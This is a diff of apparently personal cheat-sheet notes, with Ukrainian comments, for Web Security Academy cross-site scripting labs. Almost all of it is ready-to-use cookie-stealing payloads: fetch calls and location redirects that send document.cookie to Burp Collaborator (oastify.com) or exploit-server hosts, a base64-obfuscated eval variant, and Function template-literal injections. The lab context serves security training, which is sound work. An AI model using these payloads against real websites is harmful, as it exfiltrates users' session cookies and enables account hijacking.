@@ -15,26 +15,25 @@
 fetch("https://burp.oastify.com/?c="+btoa(document['cookie']))
 ```
 **+eval URL encode**
->тут готова ін'єкція яка поверта відповідно на колаборатор кукі
+>тут готова ін'єкція яка повертає відповідно на колаборатор кукі, просто передати script у exploit server
 ```
 <script>
 location="https://YOUR-LAB-ID.web-security-academy.net/?SearchTerm=%22%2Beval(atob(%22ZmV0Y2goImh0dHBzOi8vMmNmbTZlMmFpajVmZWQ3ZXl4ZTN3Mnc0dXYwbW9oYzYub2FzdGlmeS5jb20vP2M9IitidG9hKGRvY3VtZW50Wydjb29raWUnXSkp%22))}%2F%2F"
 </script>
 ```
-
-===
-
-<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
-
-=== -Function`X$ URL encode
-
+>-Function`X$ тут у нас ін'єкція із використанням динамічних шаблонів, вміст всередині ${...} виконується під час виконання шаблону.
+```
+"-Function`X${'document.location="https://burp.oastify.com/"+document.cookie'}```-"
+```
+>адаптована версія із використанням Function`X$, лише передати script у exploit server для отримання cookies
+```
 <script>
 location="https://0aa7008c03742cfb80f9085a003f00c4.web-security-academy.net/?find=%22-Function`X${'document.location=%22https://pf8ftts7s6lrxx4czzvyip2f86ex2oqd.oastify.com/%22%2Bdocument.cookie'}```-%22"
 </script>
+```
 
-=== - Function`X$
 
-"-Function`X${'document.location="https://burp.oastify.com/"+document.cookie'}```-"
+<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
 
 ===
 
